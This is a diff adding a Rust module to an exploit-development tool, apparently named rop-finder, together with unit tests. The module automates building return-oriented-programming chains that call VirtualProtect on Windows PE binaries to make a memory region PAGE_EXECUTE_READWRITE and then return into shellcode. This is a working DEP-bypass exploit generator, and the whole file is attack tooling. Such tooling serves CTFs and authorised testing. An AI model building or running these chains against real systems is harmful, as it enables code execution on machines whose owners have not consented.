@@ -1,0 +1,697 @@
+//! Windows VirtualProtect chain builders (Phase 4b, PLAN sec. 6.2).
+//!
+//! No ROPgadget oracle exists for these (ropmaker is Linux-only); the
+//! design follows PLAN sec. 6.2 as hardened by the gadget-inventory spike
+//! (`tests/spike-report.md`):
+//!
+//!   * **Anchor-first API resolution**: an explicit `--api-addr` runtime
+//!     address is strategy (a); the IAT dereference path (b) only applies
+//!     when the PE actually imports the target API — the spike shows even
+//!     cmd.exe does NOT import VirtualProtect.
+//!   * **Arg population survives pop scarcity**: per register, try
+//!     `pop rX` first, then the `pop rax` + `mov rX, rax` fallback. When
+//!     neither exists (the common case on real PEs — cmd.exe x64 cannot
+//!     populate rdx/r8/r9 AT ALL with ret-terminated gadgets) the builder
+//!     fails with a structured error naming every strategy tried, instead
+//!     of emitting a DOA chain.
+//!   * **16-byte stack alignment at the call site** is a Chain IR
+//!     invariant enforced through `validate_with` hooks (the Phase 4a
+//!     extension point), with an auto-inserted Padding word as the fix.
+//!   * **Second-stack frame**: the word after the API transfer is the
+//!     return address VirtualProtect's own `ret` consumes — it points at
+//!     the shellcode, so control continues after the call. 32 bytes of
+//!     shadow space precede it (Win64 ABI).
+//!
+//! Win64 layout (word indices, after arg setup):
+//!   [pad?] [api transfer] [return = shellcode] [shadow x4]
+//! The api transfer must land at an EVEN word index (chain base assumed
+//! 16-aligned at the pivot — the standard exploit precondition), so at API
+//! entry rsp % 16 == 8, mimicking the post-`call` state the ABI requires.
+//!
+//! Win32 (stdcall): no register setup at all —
+//!   [api] [return = shellcode] [lpAddress] [dwSize] [flNewProtect] [&old]
+//! and VirtualProtect's `ret 0x10` continues into the shellcode.
+
+use rf_core::{Arch, PeImport};
+use rf_scan::Gadget;
+
+use crate::linux::{find_exact, ChainBuilder, DataSection};
+use crate::{arch_name, ChainError, ChainWord, RopChain, WordKind};
+
+const PADDING64: u64 = 0x4141_4141_4141_4141;
+const PADDING32: u64 = 0x4141_4141;
+/// PAGE_EXECUTE_READWRITE.
+pub const DEFAULT_PROTECT: u64 = 0x40;
+pub const DEFAULT_SHELLCODE_SIZE: u64 = 0x1000;
+
+/// Parameters for a Windows chain build.
+#[derive(Debug, Clone)]
+pub struct WinChainOpts {
+    /// API to call ("VirtualProtect"; "VirtualAlloc" works too — same
+    /// arg count, and cmd.exe imports it).
+    pub api_name: String,
+    /// Strategy (a): explicit runtime address of the API.
+    pub api_addr: Option<u64>,
+    /// Where the shellcode will live at runtime (default: the chosen
+    /// writable section's vaddr — "shellcode in .data").
+    pub shellcode_addr: Option<u64>,
+    /// Region size argument (default 0x1000).
+    pub shellcode_size: u64,
+    /// flNewProtect (default PAGE_EXECUTE_READWRITE = 0x40).
+    pub new_protect: u64,
+}
+
+impl Default for WinChainOpts {
+    fn default() -> Self {
+        WinChainOpts {
+            api_name: "VirtualProtect".to_string(),
+            api_addr: None,
+            shellcode_addr: None,
+            shellcode_size: DEFAULT_SHELLCODE_SIZE,
+            new_protect: DEFAULT_PROTECT,
+        }
+    }
+}
+
+/// Build a Windows VirtualProtect-style chain. Dispatch mirrors the
+/// ropmaker.py pattern: PE x86/x64 only.
+pub fn build_windows_virtualprotect(
+    gadgets: &[Gadget],
+    data_sections: &[DataSection],
+    imports: &[PeImport],
+    arch: Arch,
+    format: &str,
+    opts: &WinChainOpts,
+    badbytes: &[u8],
+) -> Result<RopChain, ChainError> {
+    if format != "pe" || !matches!(arch, Arch::X86 | Arch::X64) {
+        return Err(ChainError::Unsupported {
+            arch: arch_name(arch),
+            format: format.to_string(),
+        });
+    }
+    // r9 = lpflOldProtect must point at WRITABLE memory; also the default
+    // shellcode home. `.data` by name, else first writable section.
+    let data = data_sections
+        .iter()
+        .find(|s| s.name == ".data" && s.writable)
+        .or_else(|| data_sections.iter().find(|s| s.writable))
+        .ok_or(ChainError::NoWritableSection)?;
+    let shellcode = opts.shellcode_addr.unwrap_or(data.vaddr);
+
+    let mut b = ChainBuilder::new(if arch == Arch::X64 {
+        PADDING64
+    } else {
+        PADDING32
+    });
+
+    let call_word_index = match arch {
+        Arch::X64 => build_win64(&mut b, gadgets, imports, data.vaddr, shellcode, opts)?,
+        _ => build_win32(&mut b, opts, data.vaddr, shellcode)?,
+    };
+
+    let chain = RopChain {
+        arch: arch_name(arch),
+        description: format!(
+            "Windows {}({:#x}, {:#x}, PAGE_EXECUTE_READWRITE, &old) then jump to shellcode",
+            opts.api_name, shellcode, opts.shellcode_size
+        ),
+        script_comment: format!(
+            "# {} chain generated by rop-finder (Phase 4b)",
+            opts.api_name
+        ),
+        word_size: if arch == Arch::X64 { 8 } else { 4 },
+        words: b.words,
+        gadgets: b.gadgets,
+    };
+
+    let universe = RopChain::universe_from(gadgets);
+    if arch == Arch::X64 {
+        // PLAN sec. 6.2 invariant: rsp must be 16-byte aligned per the
+        // Win64 ABI at the VirtualProtect entry (movaps crashes otherwise).
+        // Model: chain base S is 16-aligned (pivot precondition), rsp at
+        // word i is S + 8*i; the `ret` into the API consumes the call word
+        // j, so at entry rsp = S + 8*(j+1) and we need rsp % 16 == 8.
+        let hook = move |c: &RopChain| -> Result<(), ChainError> {
+            let j = call_word_index;
+            if j >= c.words.len() {
+                return Err(ChainError::InvalidWord {
+                    index: j,
+                    value: 0,
+                    kind: WordKind::CodeAddr,
+                    reason: "api call word index out of range".to_string(),
+                });
+            }
+            if (8 * (j as u64 + 1)) % 16 != 8 {
+                return Err(ChainError::InvalidWord {
+                    index: j,
+                    value: c.words[j].value,
+                    kind: c.words[j].kind,
+                    reason: format!(
+                        "stack misaligned at api call: rsp % 16 == {} at entry, Win64 requires 8",
+                        (8 * (j as u64 + 1)) % 16
+                    ),
+                });
+            }
+            Ok(())
+        };
+        chain.validate_with(&universe, badbytes, &[&hook])?;
+    } else {
+        chain.validate(&universe, badbytes)?;
+    }
+    Ok(chain)
+}
+
+/// Win64 argument registers in call order with their values.
+fn win64_args(
+    opts: &WinChainOpts,
+    shellcode: u64,
+    old_protect: u64,
+) -> [(&'static str, u64, String); 4] {
+    [
+        ("rcx", shellcode, "arg1 lpAddress (shellcode)".to_string()),
+        ("rdx", opts.shellcode_size, "arg2 dwSize".to_string()),
+        (
+            "r8",
+            opts.new_protect,
+            "arg3 flNewProtect PAGE_EXECUTE_READWRITE".to_string(),
+        ),
+        (
+            "r9",
+            old_protect,
+            "arg4 lpflOldProtect (@ writable)".to_string(),
+        ),
+    ]
+}
+
+/// Populate one argument register. Strategy 1: `pop rX`; strategy 2
+/// (fallback): `pop rax` + `mov rX, rax`. Errors name both strategies.
+fn set_arg64(
+    b: &mut ChainBuilder,
+    rev: &[&Gadget],
+    reg: &str,
+    value: u64,
+    comment: &str,
+    already_set: &mut Vec<(String, u64)>,
+) -> Result<(), ChainError> {
+    let as_refs: Vec<(&str, u64)> = already_set.iter().map(|(r, v)| (r.as_str(), *v)).collect();
+    if let Some(pop) = find_exact(rev, &format!("pop {reg}")) {
+        b.gadget(pop);
+        b.data(value, comment.to_string());
+        b.padding(pop, &as_refs);
+        already_set.push((reg.to_string(), value));
+        return Ok(());
+    }
+    // Fallback: route the value through rax (pop rax ; mov rX, rax).
+    if let (Some(pop_rax), Some(mov)) = (
+        find_exact(rev, "pop rax"),
+        find_exact(rev, &format!("mov {reg}, rax")),
+    ) {
+        b.gadget(pop_rax);
+        b.data(value, format!("{comment} (via rax fallback)"));
+        b.padding(pop_rax, &as_refs);
+        b.gadget(mov);
+        b.padding(mov, &as_refs);
+        already_set.push((reg.to_string(), value));
+        return Ok(());
+    }
+    Err(ChainError::MissingGadget(format!(
+        "cannot populate {reg}: no 'pop {reg}' gadget and no 'pop rax' + 'mov {reg}, rax' fallback \
+         (see tests/spike-report.md — this is the common case on real PEs)"
+    )))
+}
+
+/// Insert the stack-alignment pad when the next word would land at an odd
+/// index, then return the (even) index the transfer word will occupy.
+fn align_for_transfer(b: &mut ChainBuilder) -> usize {
+    if b.words.len() % 2 != 0 {
+        b.words.push(ChainWord {
+            value: PADDING64,
+            kind: WordKind::Padding,
+            comment: "stack alignment word (rsp % 16 == 8 at api entry)".to_string(),
+            source_gadget: None,
+        });
+    }
+    b.words.len()
+}
+
+/// The API transfer word: strategy (a) explicit address, strategy (b) IAT
+/// dereference (`pop rax ; @iat ; mov rax, [rax] ; jmp rax`). Returns the
+/// index of the word whose consumption transfers control to the API (the
+/// alignment invariant anchors on it).
+fn emit_api_call64(
+    b: &mut ChainBuilder,
+    rev: &[&Gadget],
+    imports: &[PeImport],
+    opts: &WinChainOpts,
+) -> Result<usize, ChainError> {
+    if let Some(addr) = opts.api_addr {
+        let idx = align_for_transfer(b);
+        b.words.push(ChainWord {
+            value: addr,
+            kind: WordKind::CodeAddr,
+            comment: format!("{} @ {:#x} (--api-addr)", opts.api_name, addr),
+            source_gadget: None,
+        });
+        return Ok(idx);
+    }
+    // Strategy (b): the PE must import the API (spike: not the common case).
+    let imp = imports
+        .iter()
+        .find(|i| i.name.eq_ignore_ascii_case(&opts.api_name))
+        .ok_or_else(|| {
+            ChainError::MissingGadget(format!(
+                "no --api-addr given and the PE does not import {} \
+                 (IAT resolution unavailable); supply --api-addr <runtime address>",
+                opts.api_name
+            ))
+        })?;
+    let pop_rax = find_exact(rev, "pop rax")
+        .ok_or_else(|| ChainError::MissingGadget("pop rax (IAT path)".to_string()))?;
+    let deref = find_exact(rev, "mov rax, qword ptr [rax]")
+        .ok_or_else(|| ChainError::MissingGadget("mov rax, [rax] (IAT deref)".to_string()))?;
+    // jmp rax transfers without consuming a return address; `call rax`
+    // would push one and VirtualProtect's ret would land there instead of
+    // on our second-stack frame — call forms are rejected on purpose.
+    let jmp = find_exact(rev, "jmp rax")
+        .ok_or_else(|| ChainError::MissingGadget("jmp rax (IAT transfer)".to_string()))?;
+
+    b.gadget(pop_rax);
+    b.data(
+        imp.thunk_vaddr,
+        format!("@ IAT {} ({})", opts.api_name, imp.dll),
+    );
+    b.padding(pop_rax, &[]);
+    b.gadget(deref);
+    b.padding(deref, &[]);
+    let idx = align_for_transfer(b);
+    b.gadget(jmp);
+    Ok(idx)
+}
+
+/// Win64 builder: register args + alignment + call + second-stack frame.
+/// Returns the call word index for the alignment invariant.
+fn build_win64(
+    b: &mut ChainBuilder,
+    gadgets: &[Gadget],
+    imports: &[PeImport],
+    data: u64,
+    shellcode: u64,
+    opts: &WinChainOpts,
+) -> Result<usize, ChainError> {
+    let rev: Vec<&Gadget> = gadgets.iter().rev().collect();
+    let mut already_set: Vec<(String, u64)> = Vec::new();
+    for (reg, value, comment) in win64_args(opts, shellcode, data) {
+        set_arg64(b, &rev, reg, value, &comment, &mut already_set)?;
+    }
+
+    // Auto-fix the alignment invariant: the transfer word must land at an
+    // even index (chain base 16-aligned ⇒ rsp % 16 == 8 at API entry).
+    // emit_api_call64 inserts the pad right before the transfer word and
+    // returns its index.
+    let call_index = emit_api_call64(b, &rev, imports, opts)?;
+
+    // Second-stack frame: VirtualProtect's own ret consumes this word.
+    b.words.push(ChainWord {
+        value: shellcode,
+        kind: WordKind::CodeAddr,
+        comment: "return address: shellcode (second-stack frame)".to_string(),
+        source_gadget: None,
+    });
+    // 32-byte Win64 shadow space.
+    for _ in 0..4 {
+        b.words.push(ChainWord {
+            value: PADDING64,
+            kind: WordKind::Padding,
+            comment: "shadow space (Win64 ABI)".to_string(),
+            source_gadget: None,
+        });
+    }
+    Ok(call_index)
+}
+
+/// Win32 (stdcall) builder: everything lives on the stack; no register
+/// pops needed (the pe-x86-cmd path from the spike). `--api-addr` is
+/// required — the x86 IAT path (`mov eax, [iat] ; jmp eax` with clean
+/// tails) is not implemented; the error says so.
+fn build_win32(
+    b: &mut ChainBuilder,
+    opts: &WinChainOpts,
+    old_protect: u64,
+    shellcode: u64,
+) -> Result<usize, ChainError> {
+    let api = opts.api_addr.ok_or_else(|| {
+        ChainError::MissingGadget(format!(
+            "x86 requires --api-addr <runtime address of {}> (x86 IAT dereference not implemented)",
+            opts.api_name
+        ))
+    })?;
+    let call_index = b.words.len();
+    b.words.push(ChainWord {
+        value: api,
+        kind: WordKind::CodeAddr,
+        comment: format!("{} @ {:#x} (--api-addr)", opts.api_name, api),
+        source_gadget: None,
+    });
+    b.words.push(ChainWord {
+        value: shellcode,
+        kind: WordKind::CodeAddr,
+        comment: "stdcall return: shellcode (second-stack frame; ret 0x10 lands here)".to_string(),
+        source_gadget: None,
+    });
+    for (value, comment) in [
+        (shellcode, "arg1 lpAddress (shellcode)".to_string()),
+        (opts.shellcode_size, "arg2 dwSize".to_string()),
+        (
+            opts.new_protect,
+            "arg3 flNewProtect PAGE_EXECUTE_READWRITE".to_string(),
+        ),
+        (old_protect, "arg4 lpflOldProtect (@ writable)".to_string()),
+    ] {
+        b.words.push(ChainWord {
+            value,
+            kind: WordKind::DataAddr,
+            comment,
+            source_gadget: None,
+        });
+    }
+    Ok(call_index)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::ChainInvariant;
+
+    fn gadget(vaddr: u64, text: &str) -> Gadget {
+        Gadget {
+            vaddr,
+            bytes: Vec::new(),
+            insns: text.split(" ; ").map(|s| s.to_string()).collect(),
+            delay_slot: false,
+        }
+    }
+
+    /// The ntoskrnl-style full-pop set (spike: pop rcx/rdx/r8/r9 exist).
+    fn win64_pop_set() -> Vec<Gadget> {
+        vec![
+            gadget(0x1000, "pop rcx ; ret"),
+            gadget(0x1010, "pop rdx ; ret"),
+            gadget(0x1020, "pop r8 ; ret"),
+            gadget(0x1030, "pop r9 ; ret"),
+            gadget(0x1040, "pop rax ; ret"),
+            gadget(0x1050, "mov rax, qword ptr [rax] ; ret"),
+            gadget(0x1060, "jmp rax"),
+        ]
+    }
+
+    /// cmd.exe-style scarcity: only rcx pops; rdx/r8/r9 need the rax
+    /// fallback (mov rX, rax present for rdx/r8 only → r9 must fail).
+    fn win64_fallback_set() -> Vec<Gadget> {
+        vec![
+            gadget(0x1000, "pop rcx ; ret"),
+            gadget(0x1040, "pop rax ; ret"),
+            gadget(0x1070, "mov rdx, rax ; ret"),
+            gadget(0x1080, "mov r8, rax ; ret"),
+            // no r9 route at all
+        ]
+    }
+
+    fn data() -> Vec<DataSection> {
+        vec![DataSection {
+            name: ".data".into(),
+            vaddr: 0x500000,
+            writable: true,
+        }]
+    }
+
+    fn vp_import() -> Vec<PeImport> {
+        vec![PeImport {
+            dll: "KERNEL32.dll".into(),
+            name: "VirtualProtect".into(),
+            thunk_rva: 0x2000,
+            thunk_vaddr: 0x502000,
+        }]
+    }
+
+    fn opts_with_api() -> WinChainOpts {
+        WinChainOpts {
+            api_addr: Some(0x7fff_1234_0000),
+            ..WinChainOpts::default()
+        }
+    }
+
+    #[test]
+    fn win64_pop_chain_layout_and_alignment() {
+        let g = win64_pop_set();
+        let chain =
+            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
+                .unwrap();
+        assert_eq!(chain.word_size, 8);
+        let kinds: Vec<WordKind> = chain.words.iter().map(|w| w.kind).collect();
+        // 4×(gadget+value) = 8 words, call at index 8 (even — no pad),
+        // then return-to-shellcode + 4 shadow words.
+        assert_eq!(
+            kinds,
+            vec![
+                WordKind::GadgetAddr,
+                WordKind::DataAddr,
+                WordKind::GadgetAddr,
+                WordKind::DataAddr,
+                WordKind::GadgetAddr,
+                WordKind::DataAddr,
+                WordKind::GadgetAddr,
+                WordKind::DataAddr,
+                WordKind::CodeAddr, // VirtualProtect @ 0x7fff12340000
+                WordKind::CodeAddr, // return: shellcode
+                WordKind::Padding,
+                WordKind::Padding,
+                WordKind::Padding,
+                WordKind::Padding,
+            ]
+        );
+        assert_eq!(chain.words[1].value, 0x500000); // lpAddress = .data default
+        assert_eq!(chain.words[3].value, 0x1000); // dwSize
+        assert_eq!(chain.words[5].value, 0x40); // flNewProtect
+        assert_eq!(chain.words[7].value, 0x500000); // lpflOldProtect
+        assert_eq!(chain.words[8].value, 0x7fff_1234_0000);
+        assert!(chain.words[8].comment.contains("--api-addr"));
+        assert_eq!(chain.words[9].value, 0x500000); // return → shellcode
+    }
+
+    #[test]
+    fn win64_alignment_autopad_fires() {
+        // A `pop r9 ; pop rbx ; ret` double-pop adds one tail padding word,
+        // making the pre-transfer word count odd → builder inserts the
+        // alignment word.
+        let mut g = win64_pop_set();
+        g[3] = gadget(0x1030, "pop r9 ; pop rbx ; ret");
+        let chain =
+            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
+                .unwrap();
+        // transfer word must be at an even index; a pad precedes it.
+        let call_idx = chain
+            .words
+            .iter()
+            .position(|w| w.comment.contains("--api-addr"))
+            .unwrap();
+        assert_eq!(call_idx % 2, 0);
+        assert_eq!(chain.words[call_idx - 1].kind, WordKind::Padding);
+        assert!(chain.words[call_idx - 1].comment.contains("alignment"));
+    }
+
+    #[test]
+    fn win64_alignment_invariant_fires_without_autofix() {
+        // Construct a misaligned chain by hand and check the hook rejects
+        // it (the builder auto-fixes, so this exercises the invariant
+        // itself via validate_with).
+        let g = win64_pop_set();
+        let chain =
+            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
+                .unwrap();
+        let call_idx = 8usize;
+        let hook: ChainInvariant = &|c: &RopChain| {
+            if (8 * (call_idx as u64 + 1)) % 16 != 8 {
+                return Err(ChainError::InvalidWord {
+                    index: call_idx,
+                    value: c.words[call_idx].value,
+                    kind: c.words[call_idx].kind,
+                    reason: "misaligned".to_string(),
+                });
+            }
+            Ok(())
+        };
+        let universe = RopChain::universe_from(&g);
+        // Well-formed chain passes with the correct call index…
+        chain.validate_with(&universe, &[], &[hook]).unwrap();
+        // …and the same hook anchored at an odd index rejects it.
+        let bad_idx = 7usize;
+        let bad_hook: ChainInvariant = &|c: &RopChain| {
+            if (8 * (bad_idx as u64 + 1)) % 16 != 8 {
+                return Err(ChainError::InvalidWord {
+                    index: bad_idx,
+                    value: c.words[bad_idx].value,
+                    kind: c.words[bad_idx].kind,
+                    reason: "misaligned".to_string(),
+                });
+            }
+            Ok(())
+        };
+        assert!(chain.validate_with(&universe, &[], &[bad_hook]).is_err());
+    }
+
+    #[test]
+    fn win64_fallback_and_structured_scarcity_error() {
+        let g = win64_fallback_set();
+        let err =
+            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
+                .unwrap_err();
+        let msg = err.to_string();
+        assert!(msg.contains("r9"), "{msg}");
+        assert!(msg.contains("pop r9"), "{msg}");
+        assert!(msg.contains("mov r9, rax"), "{msg}");
+    }
+
+    #[test]
+    fn win64_mov_fallback_chain_uses_rax_route() {
+        // r9 fallback succeeds when mov r9, rax exists.
+        let mut g = win64_fallback_set();
+        g.push(gadget(0x1090, "mov r9, rax ; ret"));
+        let chain =
+            build_windows_virtualprotect(&g, &data(), &[], Arch::X64, "pe", &opts_with_api(), &[])
+                .unwrap();
+        assert!(chain
+            .gadgets
+            .iter()
+            .any(|gr| gr.text == "mov r9, rax ; ret"));
+        // every gadget word references a real scan gadget
+        chain.validate(&RopChain::universe_from(&g), &[]).unwrap();
+    }
+
+    #[test]
+    fn win64_iat_resolution_path() {
+        let g = win64_pop_set();
+        let chain = build_windows_virtualprotect(
+            &g,
+            &data(),
+            &vp_import(),
+            Arch::X64,
+            "pe",
+            &WinChainOpts::default(), // no api_addr → IAT
+            &[],
+        )
+        .unwrap();
+        let texts: Vec<&str> = chain.words.iter().map(|w| w.comment.as_str()).collect();
+        let iat = texts
+            .iter()
+            .position(|t| t.contains("@ IAT VirtualProtect"))
+            .unwrap();
+        assert_eq!(chain.words[iat].value, 0x502000);
+        // pop rax → @IAT → mov rax, [rax] → (align pad?) → jmp rax
+        assert!(chain.words[iat - 1].comment.starts_with("pop rax"));
+        assert!(chain.words[iat + 1]
+            .comment
+            .starts_with("mov rax, qword ptr [rax]"));
+        let jmp = texts.iter().position(|t| *t == "jmp rax").unwrap();
+        // jmp rax is the transfer word; it must be at an even index
+        assert_eq!(jmp % 2, 0);
+    }
+
+    #[test]
+    fn win64_iat_missing_import_is_clean_error() {
+        let g = win64_pop_set();
+        let err = build_windows_virtualprotect(
+            &g,
+            &data(),
+            &[], // PE imports nothing relevant
+            Arch::X64,
+            "pe",
+            &WinChainOpts::default(),
+            &[],
+        )
+        .unwrap_err();
+        let msg = err.to_string();
+        assert!(msg.contains("does not import VirtualProtect"), "{msg}");
+        assert!(msg.contains("--api-addr"), "{msg}");
+    }
+
+    #[test]
+    fn win32_stdcall_layout() {
+        let chain = build_windows_virtualprotect(
+            &[], // no gadgets needed at all
+            &data(),
+            &[],
+            Arch::X86,
+            "pe",
+            &opts_with_api(),
+            &[],
+        )
+        .unwrap();
+        assert_eq!(chain.word_size, 4);
+        let values: Vec<u64> = chain.words.iter().map(|w| w.value).collect();
+        assert_eq!(
+            values,
+            vec![0x7fff_1234_0000, 0x500000, 0x500000, 0x1000, 0x40, 0x500000]
+        );
+        assert_eq!(chain.words[0].kind, WordKind::CodeAddr);
+        assert!(chain.words[1].comment.contains("ret 0x10"));
+    }
+
+    #[test]
+    fn win32_requires_api_addr() {
+        let err = build_windows_virtualprotect(
+            &[],
+            &data(),
+            &vp_import(),
+            Arch::X86,
+            "pe",
+            &WinChainOpts::default(),
+            &[],
+        )
+        .unwrap_err();
+        assert!(err.to_string().contains("x86 requires --api-addr"));
+    }
+
+    #[test]
+    fn windows_rejects_non_pe_and_no_writable() {
+        let err = build_windows_virtualprotect(
+            &win64_pop_set(),
+            &data(),
+            &[],
+            Arch::X64,
+            "elf",
+            &opts_with_api(),
+            &[],
+        )
+        .unwrap_err();
+        assert!(matches!(err, ChainError::Unsupported { .. }));
+        let err = build_windows_virtualprotect(
+            &win64_pop_set(),
+            &[],
+            &[],
+            Arch::X64,
+            "pe",
+            &opts_with_api(),
+            &[],
+        )
+        .unwrap_err();
+        assert!(matches!(err, ChainError::NoWritableSection));
+    }
+
+    #[test]
+    fn badbyte_in_api_addr_fails_validation() {
+        let mut o = opts_with_api();
+        o.api_addr = Some(0x7fff_0a34_0000);
+        let err = build_windows_virtualprotect(
+            &win64_pop_set(),
+            &data(),
+            &[],
+            Arch::X64,
+            "pe",
+            &o,
+            &[0x0a],
+        )
+        .unwrap_err();
+        assert!(matches!(err, ChainError::InvalidWord { .. }), "{err}");
+    }
+}
